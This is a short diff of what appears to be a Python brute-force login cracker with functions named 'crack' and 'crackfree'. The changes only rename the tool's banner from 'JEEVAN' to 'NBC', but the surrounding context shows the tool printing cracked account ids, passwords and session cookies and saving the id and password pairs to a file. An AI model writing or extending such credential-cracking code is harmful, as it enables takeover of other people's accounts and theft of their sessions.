@@ -664,7 +664,7 @@ def crack(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[0;92m[JEEVAN-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
+                print(f'\r\033[0;92m[NBC-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                 os.system('espeak -a 300 " JEEVAN,  Ok,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
@@ -1434,7 +1434,7 @@ def crackfree(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•JEEVAN-Ok] {idf} • {pw} ')
+                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•NBC-Ok] {idf} • {pw} ')
                 os.system('espeak -a 300 " Ok,  NETRA KING,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
